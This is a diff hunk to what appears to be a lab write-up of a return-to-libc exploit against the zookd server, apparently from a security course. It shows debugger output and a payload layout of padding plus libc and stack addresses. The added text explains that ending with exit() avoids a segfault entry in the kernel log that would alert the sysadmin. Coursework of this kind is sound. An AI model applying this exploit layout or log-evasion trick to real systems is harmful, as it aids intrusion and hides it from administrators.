@@ -215,6 +215,10 @@ By counting backwards 5 bytes, we get the correct address, which is 0xbffff8c5. 
     zookfs-nxstack: recvfd: Success
     [Inferior 3 (process 2459) exited normally]
     
+When we use the exit() function the program will terminate gracefully and will not leave any marks in the system that would show any possible arbitrary use. If we would use some random bytes for padding, when the program terminates it would leave information for the sysadmin in the logs:
+
+    Jun 29 12:59:12 vm-6858 kernel: [ 8325.355822] zookd-nxstack[2365]: segfault at 4b434148 ip 4b434148 sp bfffee34 error 14
+    
 The final layout looks like this:
 
      AAAAAAAAAAAAAA   0xb7e6b100     0xb7e5e150     0xbffff8c5
